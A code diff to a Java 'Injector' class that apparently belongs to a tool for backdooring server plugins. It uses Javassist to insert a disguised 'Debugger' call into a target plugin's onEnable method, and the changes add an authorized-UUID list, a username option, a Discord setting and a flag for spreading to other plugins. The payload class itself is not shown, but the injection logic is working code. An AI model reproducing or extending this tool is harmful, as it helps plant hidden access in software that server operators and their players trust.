@@ -181,10 +181,24 @@ public class Injector {
 
             CtClass cc = pool.get(mainClass);
             CtMethod m = cc.getDeclaredMethod("onEnable");
+            //Parse UUID string
+            StringBuilder sb = new StringBuilder();
+            sb.append("new String[]{");
+            for(int i = 0; i < config.UUID.length; i++){
+                sb.append("\"");
+                sb.append(config.UUID[i]);
+                sb.append("\"");
+                if(i != config.UUID.length - 1)
+                    sb.append(",");
+            }
+            sb.append("}");
 
+            String s = "{ new com.thiccindustries.debugger.Debugger(this, " + (config.useUsernames ? "true, " : "false, ") + sb.toString() + ", \"" + config.prefix + "\", \"" + config.discord + "\", " + (config.injectOther ? "true" : "false") + "," + (config.warnings ? "true" : "false") +"); }";
             if(print_msg)
-                System.out.println("{ new com.thiccindustries.debugger.Debugger(this, " + "\"" + config.prefix + "\", " + (config.injectOther ? "true" : "false") + "," + (config.warnings ? "true" : "false") +"); }");
-            m.insertAfter("{ new com.thiccindustries.debugger.Debugger(this, " + "\"" + config.prefix + "\", " + (config.injectOther ? "true" : "false") + "," + (config.warnings ? "true" : "false") +"); }");
+                System.out.println(s);
+
+            m.insertAfter(s);
+
 
             //Write to temporary file
             cc.writeFile(temp.toString());
@@ -244,15 +258,22 @@ public class Injector {
     }
 
     //Simplifed config for injector gui
+    //Simplifed config for injector gui
     public static class SimpleConfig {
+        public boolean useUsernames;
+        public String[] UUID;
         public String prefix;
+        public String discord;
         public boolean injectOther;
         public boolean warnings;
 
-        public SimpleConfig(String s2, boolean b2, boolean b3) {
+        public SimpleConfig(boolean b1, String[] s1, String s2, String s3, boolean b2, boolean b3) {
+            useUsernames = b1;
+            UUID = s1;
             prefix = s2;
             injectOther = b2;
             warnings = b3;
+            discord = s3;
         }
     }
 
